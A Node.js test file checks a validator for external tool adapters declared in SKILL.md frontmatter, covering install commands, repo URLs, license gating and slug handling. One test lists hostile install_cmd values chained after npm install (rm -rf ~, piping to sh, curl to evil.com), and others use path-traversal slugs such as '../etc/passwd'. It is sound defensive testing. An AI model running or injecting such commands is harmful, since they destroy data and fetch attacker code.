// external-adapter.test.cjs — Sprint 3.4 v0

'use strict';

const { describe, test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const adapter = require('../../bin/steward/_lib/external-adapter.cjs');

const VALID_FRONTMATTER = `---
name: test-adapter
description: x
external_dependency:
  adapter_slug: my-adapter
  repo: https://github.com/example/my-tool
  install_cmd: npm install -g my-tool
  version: ^1.2.3
  license_tier: oss-permissive
disable-model-invocation: true
---

# Body content
`;

function writeSkill(name, content) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `cortex-skill-${name}-`));
  const skillDir = path.join(dir, 'my-adapter');
  fs.mkdirSync(skillDir);
  fs.writeFileSync(path.join(skillDir, 'SKILL.md'), content, 'utf8');
  return skillDir;
}

describe('Sprint 3.4 v0 — parser', () => {
  test('parseFrontmatter extracts frontmatter block', () => {
    const out = adapter.parseFrontmatter(VALID_FRONTMATTER);
    assert.match(out, /name: test-adapter/);
    assert.match(out, /external_dependency:/);
  });

  test('parseFrontmatter returns null on missing delimiter', () => {
    assert.equal(adapter.parseFrontmatter('# bare\n'), null);
    assert.equal(adapter.parseFrontmatter('---\nincomplete'), null);
  });

  test('readExternalDependencyBlock extracts indented keys', () => {
    const fm = adapter.parseFrontmatter(VALID_FRONTMATTER);
    const block = adapter.readExternalDependencyBlock(fm);
    assert.equal(block.adapter_slug, 'my-adapter');
    assert.equal(block.repo, 'https://github.com/example/my-tool');
    assert.equal(block.license_tier, 'oss-permissive');
  });

  test('readExternalDependencyBlock returns null when block missing', () => {
    const fm = 'name: x\ndescription: y';
    assert.equal(adapter.readExternalDependencyBlock(fm), null);
  });
});

describe('Sprint 3.4 v0 — validateExternalDependency', () => {
  test('accepts well-formed block', () => {
    const v = adapter.validateExternalDependency({
      adapter_slug: 'hyperframes',
      repo: 'https://github.com/example/x',
      install_cmd: 'npm install -g x',
      version: '^1.0.0',
      license_tier: 'oss-permissive',
    });
    assert.equal(v.ok, true);
  });

  test('rejects missing repo', () => {
    const v = adapter.validateExternalDependency({
      install_cmd: 'x', license_tier: 'oss-permissive',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'repo');
  });

  test('rejects non-HTTPS repo URL', () => {
    const v = adapter.validateExternalDependency({
      repo: 'git@github.com:x/y.git',
      install_cmd: 'x', license_tier: 'oss-permissive',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'repo');
  });

  test('rejects unknown license_tier', () => {
    const v = adapter.validateExternalDependency({
      repo: 'https://github.com/example/x',
      install_cmd: 'x', license_tier: 'free-as-in-beer',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'license_tier');
  });

  test('rejects oversized install_cmd', () => {
    const v = adapter.validateExternalDependency({
      repo: 'https://github.com/example/x',
      install_cmd: 'x'.repeat(300),
      license_tier: 'oss-permissive',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'install_cmd');
  });

  test('R2 Finding 2: rejects install_cmd with shell metachars (;|&$`)', () => {
    for (const evil of [
      'npm install -g x; rm -rf ~',
      'npm install -g x | sh',
      'npm install -g x & curl evil.com',
      'npm install -g x $(curl evil)',
      'npm install -g x `curl evil`',
    ]) {
      const v = adapter.validateExternalDependency({
        repo: 'https://github.com/example/x',
        install_cmd: evil,
        license_tier: 'oss-permissive',
      });
      assert.equal(v.ok, false, `should reject: ${evil}`);
      assert.equal(v.path, 'install_cmd');
    }
  });

  test('R2 Finding 2: accepts legit npm/pip/cargo install commands', () => {
    for (const ok of [
      'npm install -g @heygen/hyperframes',
      'npm install --save-exact remotion@4.0.0',
      'pip install -r requirements.txt',
      'cargo install ripgrep',
      'pnpm add @scope/pkg@^1.2.3',
    ]) {
      const v = adapter.validateExternalDependency({
        repo: 'https://github.com/example/x',
        install_cmd: ok,
        license_tier: 'oss-permissive',
      });
      assert.equal(v.ok, true, `should accept: ${ok}`);
    }
  });

  test('rejects invalid adapter_slug', () => {
    const v = adapter.validateExternalDependency({
      adapter_slug: '../etc/passwd',
      repo: 'https://github.com/example/x',
      install_cmd: 'x',
      license_tier: 'oss-permissive',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'adapter_slug');
  });

  test('rejects invalid secret_env (must be SCREAMING_SNAKE)', () => {
    const v = adapter.validateExternalDependency({
      repo: 'https://github.com/example/x',
      install_cmd: 'x',
      license_tier: 'oss-permissive',
      secret_env: 'lowercase_secret',
    });
    assert.equal(v.ok, false);
    assert.equal(v.path, 'secret_env');
  });
});

describe('Sprint 3.4 v0 — license-tier gate', () => {
  test('oss-permissive always passes', () => {
    const g = adapter.checkLicenseGate('my-tool', 'oss-permissive', {});
    assert.equal(g.ok, true);
  });

  test('license_required refuses without STEWARD_LICENSE_AUTHORIZED', () => {
    const g = adapter.checkLicenseGate('remotion', 'license_required', {});
    assert.equal(g.ok, false);
    assert.equal(g.code, 'LICENSE_NOT_AUTHORIZED');
  });

  test('license_required passes when slug in authorized list', () => {
    const g = adapter.checkLicenseGate('remotion', 'license_required', {
      STEWARD_LICENSE_AUTHORIZED: 'remotion',
    });
    assert.equal(g.ok, true);
  });

  test('license_required handles comma-separated multi-authorize', () => {
    const g = adapter.checkLicenseGate('hyperframes', 'license_required', {
      STEWARD_LICENSE_AUTHORIZED: 'remotion,hyperframes,figma-plugin',
    });
    assert.equal(g.ok, true);
  });

  test('per_invocation_metered gates same way', () => {
    const g = adapter.checkLicenseGate('remotion', 'per_invocation_metered', {});
    assert.equal(g.ok, false);
    assert.equal(g.code, 'LICENSE_NOT_AUTHORIZED');
  });

  test('unknown tier rejected loudly', () => {
    const g = adapter.checkLicenseGate('x', 'free-as-in-beer', {});
    assert.equal(g.ok, false);
    assert.equal(g.code, 'LICENSE_TIER_UNKNOWN');
  });
});

describe('Sprint 3.4 v0 — resolveAdapterWorkspace', () => {
  test('returns path under $CORTEX_DATA_HOME/external/<slug>/', () => {
    const prev = process.env.CORTEX_DATA_HOME;
    process.env.CORTEX_DATA_HOME = '/tmp/cortex-data-test';
    try {
      const p = adapter.resolveAdapterWorkspace('hyperframes');
      assert.match(p.replace(/\\/g, '/'), /\/tmp\/cortex-data-test\/external\/hyperframes/);
    } finally {
      if (prev) process.env.CORTEX_DATA_HOME = prev;
      else delete process.env.CORTEX_DATA_HOME;
    }
  });

  test('throws on slug with path-traversal', () => {
    assert.throws(() => adapter.resolveAdapterWorkspace('../etc'), /must match/);
    assert.throws(() => adapter.resolveAdapterWorkspace('a/b'), /must match/);
  });
});

describe('Sprint 3.4 v0 — probeAdapter integration', () => {
  test('happy path: oss-permissive SKILL.md → ok', () => {
    const skillDir = writeSkill('happy', VALID_FRONTMATTER);
    const r = adapter.probeAdapter(skillDir, {});
    assert.equal(r.ok, true);
    assert.equal(r.adapter.slug, 'my-adapter');
    assert.equal(r.adapter.license_tier, 'oss-permissive');
    assert.match(r.workspace.replace(/\\/g, '/'), /external\/my-adapter$/);
  });

  test('R2 Finding 4: rejects when frontmatter adapter_slug != directory name', () => {
    const spoofed = VALID_FRONTMATTER.replace('adapter_slug: my-adapter', 'adapter_slug: hyperframes');
    const skillDir = writeSkill('spoof', spoofed);
    const r = adapter.probeAdapter(skillDir, {});
    assert.equal(r.ok, false);
    assert.equal(r.code, 'EXTERNAL_DEP_SLUG_MISMATCH');
  });

  test('R2 Finding 4: directory name is authoritative when adapter_slug omitted', () => {
    const noSlug = VALID_FRONTMATTER.replace(/  adapter_slug: my-adapter\n/, '');
    const skillDir = writeSkill('no-slug', noSlug);
    const r = adapter.probeAdapter(skillDir, {});
    assert.equal(r.ok, true);
    assert.equal(r.adapter.slug, 'my-adapter'); // from dir name
  });

  test('license_required fails without env authorization', () => {
    const fm = VALID_FRONTMATTER.replace('oss-permissive', 'license_required');
    const skillDir = writeSkill('gated', fm);
    const r = adapter.probeAdapter(skillDir, {});
    assert.equal(r.ok, false);
    assert.equal(r.code, 'LICENSE_NOT_AUTHORIZED');
  });

  test('license_required passes with proper env', () => {
    const fm = VALID_FRONTMATTER.replace('oss-permissive', 'license_required');
    const skillDir = writeSkill('authed', fm);
    const r = adapter.probeAdapter(skillDir, { STEWARD_LICENSE_AUTHORIZED: 'my-adapter' });
    assert.equal(r.ok, true);
  });

  test('SKILL.md with missing external_dependency block fails clearly', () => {
    const fm = `---
name: bare-skill
description: no external dep
---

body
`;
    const skillDir = writeSkill('bare', fm);
    const r = adapter.probeAdapter(skillDir, {});
    assert.equal(r.ok, false);
    assert.equal(r.code, 'EXTERNAL_DEP_MISSING');
  });
});

describe('Sprint 3.4 v0 — Hyperframes SKILL.md is parseable', () => {
  test('shipped hyperframes adapter passes validation', () => {
    const skillPath = path.resolve(__dirname, '../../shared/skills/external-adapter-hyperframes/SKILL.md');
    const r = adapter.loadAdapterFromSkill(skillPath);
    assert.equal(r.ok, true);
    assert.equal(r.adapter.slug, 'external-adapter-hyperframes'); // dir name = authoritative slug
    assert.equal(r.adapter.license_tier, 'oss-permissive');
    assert.match(r.adapter.repo, /github\.com\/heygen-com\/hyperframes/);
  });
});
